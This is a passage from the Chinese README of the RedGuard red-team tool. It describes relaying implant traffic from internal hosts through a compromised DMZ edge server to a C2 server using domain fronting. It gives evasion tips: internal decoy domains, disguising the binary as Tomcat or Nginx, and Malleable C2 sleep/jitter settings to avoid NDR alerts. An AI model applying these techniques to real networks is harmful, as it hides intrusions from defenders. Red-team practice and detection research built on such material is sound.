在攻防对抗场景下，目前大部分单位网络仍然是边界化防御，这里我们思考一个场景就是当处于DMZ区域的对外服务器在进行正常的业务环境下，往往都会配置相关出入网策略，这时当边缘的对外服务器能够出入网但不能直接访问内网主机，内网的PC或者相关服务器不直接访问公网，但是能够访问DMZ区域的业务服务器，这时我就可以将边缘节点的主机作为一个RG节点，将内网上线流量中转至我们的C2设施上，是不是听起来与常规的代理中转上线很像？但是，这只是技巧实现的一种展现形式，更多的TIPS我们继续往下看。

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1660187188707.png)

当我们在打点的过程中拿下一台边缘主机，假设我们已经接管了Shell权限，这时我们将RG部署在这台服务器上以此作为我们的前置节点 **（实战场景下，配置文件都是写死在程序中的，甚至将木马与RG结合为同一个程序**。

**配置文件如下：**

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1660183480032.png)

具体实现的相关配置我们主要关注箭头所指的地方即可，**上面的箭头1为内网主机与边缘节点交互的HOST域名**，这里建议根据目标单位具体场景设置相关内网域名，试想一下内网中两台主机关于内网域名的流量交互，BT有没有魄力直接切断交互流量呢，当然如果他们能够判断出是恶意交互流量的话。**箭头2所指就是常规域前置的设置**，这一个键值对，键对应的是上线的HOST而值则对应了代理的地址，这里我们可以设置为任意使用了相同CDN厂商的HTTPS域名即可 **（CDN节点IP也可以的，记得带上http(s)://协议即可**。

EdgeHost即为我们云服务厂商的域前置所使用域名，也就是RG边缘节点通过CDN节点至C2交互时所使用的域名，是的，RG会修改合法请求过来的HOST域名并修改为能够正常通信的云服务CDN域名。

EdgeTarget是内网交互的域名，与箭头1需要相同，也只有HOST为这里设置的域名请求的流量才会被认为是合法的，RG才会进一步修改为云服务CDN域名从而进行后续通信。

**这里我们总结一下：**

就是边缘节点与内网之间主机的交互即通过设置的内网域名，当木马发起请求至RG的边缘节点，会判断请求流量HOST是否为配置文件中设置的内网域名，如果符合则认为是合法的RG会修改HOST为EdgeHost设置的云服务厂商CDN域名进行后续通信将流量中转至C2服务器，实现了整个链路的全隐匿高度混淆。试想一下，内网域名与边缘节点交互的是内网域名，然而边缘节点又进一步更改了实际交互的代理地址及交互HOST，达到了两台主机之间交互信息的不对称，使溯源难度更大，难以排查。

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/66b9e60fb8303b3c6b457cc8134a436.png)

**边缘节点与内网主机交互流量，如上图所示**

这样方式还有一个好处就是针对云沙箱环境下，由于我们的交互IP是根据内网定制化的，那么沙箱在分析时不可能针对内网IP进行连通性关联分析。

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/9f247da30a078c83079465a55d6df6d.jpg)

在配置的时候需要注意一点，就是木马请求时的HOST应该是：

- **HOST：内网域名（RG配置文件中的设置的）**
- **IP：边缘主机内网IP**
- **上线端口：443（与RG配置文件http(s)监听端口匹配）**
- **监听端口：C2实际上线的端口**

C2监听器设置如下：

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1660189311172.jpg)

与请求相对的是C2监听器的HOST应该是云服务厂商CDN域名，只要最终流量能够中转到C2服务器即可。

内网节点交互流量，如下图可以看到正常的对DMZ区域的内网IP访问了443端口，内网服务器或者PC与DMZ区域的业务系统有连接也不足为奇吧。

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/e84350da6fc7e5b0195177047cf945c.jpg)

边缘主机的交互流量如图所示，实际场景下不会有大量的TIME_WAIT，这里因为为了测试我把心跳包sleep设置为了0，实战场景下设置较大的心跳包抖动以及sleep时间是比较稳妥地。并且个人觉得实战场景下没有使用HTTP流量的，明文流量这不是给态感白给吗哈哈？所以一般这一端口是不会开启的，我们再将RG的文件名改成Tomcat、Apache，Nginx之类的使其交互看起来更加迷惑一些。

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/2d703582e313f535c6c4f48b922bed8.jpg)

说到了心跳包抖动跟sleep时间的问题，直接在Malleable C2 Profile文件中设置以下字段即可。

```bash
set sleeptime "3000";
set jitter    "20";
```

如果不进行设置的话，则可能出现异常心跳包告警，当然多数情况下研判人员都会认为是误报从而忽略，但是为了稳妥起见，建议配置一下就不会引起异常心跳包的告警了，当时是通过360 NDR设备测试的，具体效果如下：

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/3b15f94c57fa78bcf31cd67f4b8f191.jpg)

而对于HTTPS的流量，市面上任何一个流量监测设备都是无法审查流量的，目前的监测设备本质上都是敏感词匹配，甚至于某个厂商设备数据包检测的比赛中，要求使用明文包，不禁让人怀疑在实战场景下真的会有RT用明文流量交互吗？而除了上面讲到的交互信息不对称，这种方式最大的好处就是将RG节点放置到了边缘节点从而实现前置流量控制，从而赋予与常规RG相同的功能效果。

而RG节点的后置节点变为了CDN节点转发至C2服务器，常规场景下域前置都是作为第一层请求节点的，而边缘主机上线则放置到了RG之后实现上线，DMZ区域的业务系统与公网CDN IP交互看起来也是那么的和谐。而在这个过程中，内网主机以及边缘主机都没有直接与我们的C2进行交互，也是这种高级隐匿手法优雅所在。

**当然除了上面提到比之netsh、iptables代理中转上线更好的因素之外，简易的配置以及不存在配置记录也是优点之一。**

# 0x05 Loading

感谢各位用户的支持，RedGuard也会坚持进行完善更新的，希望 RedGuard 能够让更多安全从业者所知，工具参考了RedWarden的设计思想。

**欢迎大家多多提出需求，RedGuard也会在这些需求中不断地成长，完善！**

**关于开发者 风起 相关文章：https://www.anquanke.com/member.html?memberId=148652**

> 2022Kcon黑客大会兵器谱作者
>
> 第十届ISC互联网安全大会 高级攻防论坛《C2设施前置流量控制技术》议题
>
> https://isc.n.cn/m/pages/live/index?channel_id=iscyY043&ncode=UR6KZ&room_id=1981905&server_id=785016&tab_id=253
> 
> 基于边界节点链路交互C2流量
> 
> https://www.anquanke.com/post/id/278140
>
> 云沙箱流量识别技术剖析
>
> https://www.anquanke.com/post/id/277431
>
> JARM指纹随机化技术实现
>
> https://www.anquanke.com/post/id/276546
>
> C2 基础设施威胁情报对抗策略
>
> https://paper.seebug.org/3022/

**Kunyu: https://github.com/knownsec/Kunyu**

> 风起于青萍之末，浪成于微澜之间。


# 0x06 Community

如果有问题或者需求可以在项目下提交issue，或通过添加WeChat联系工具作者。

![867551fe860b10ca1396498a85422b4.jpg](https://github.com/wikiZ/RedGuardImage/raw/main/20220522141706-ce37e178-d996-1.png)
